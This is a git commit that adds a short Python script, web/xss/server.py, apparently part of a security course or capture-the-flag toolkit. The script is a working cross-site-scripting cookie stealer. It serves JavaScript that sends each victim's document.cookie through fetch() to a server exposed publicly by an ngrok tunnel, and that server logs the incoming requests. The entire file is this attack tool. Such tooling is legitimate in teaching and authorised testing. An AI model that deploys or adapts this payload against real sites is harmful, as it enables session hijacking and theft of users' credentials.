02470e168f30fb76af8bdf369b585aebc22b65dc
Robert Xiao <brx@cs.ubc.ca>
2020-09-02 19:52:09 -0600

    Reorg web stuff

---
+++ web/xss/server.py
@@ -0,0 +1,43 @@
+#!/usr/bin/env python3
+# adapted from https://gist.github.com/phrawzty/62540f146ee5e74ea1ab
+from http.server import HTTPServer, SimpleHTTPRequestHandler
+import logging
+import os
+from urllib.parse import urlparse
+import threading
+from pyngrok import ngrok
+
+PORT = 8000
+
+class XSSHandler(SimpleHTTPRequestHandler):
+    url = 'http://localhost:%d' % PORT
+    def do_GET(self):
+        print(self.headers)
+        urlparts = urlparse(self.path)
+        print(urlparts)
+
+        self.send_response(200)
+        self.send_header('Content-Type', 'text/javascript')
+        self.send_header('Access-Control-Allow-Origin', '*')
+        self.end_headers()
+        self.wfile.write(f"fetch('{self.url}/x?' + document.cookie)".encode())
+
+def start_server():
+    os.chdir('static')
+    httpd = HTTPServer(("", PORT), XSSHandler)
+    httpd.allow_reuse_address = True
+    t = threading.Thread(target=httpd.serve_forever)
+    t.daemon = True
+    t.start()
+
+    url = ngrok.connect(port=PORT, proto='http')
+    url = url.replace('http', 'https')
+    XSSHandler.url = url
+    return url
+
+if __name__ == '__main__':
+    import time
+    url = start_server()
+    print(url)
+    while 1:
+        time.sleep(1)
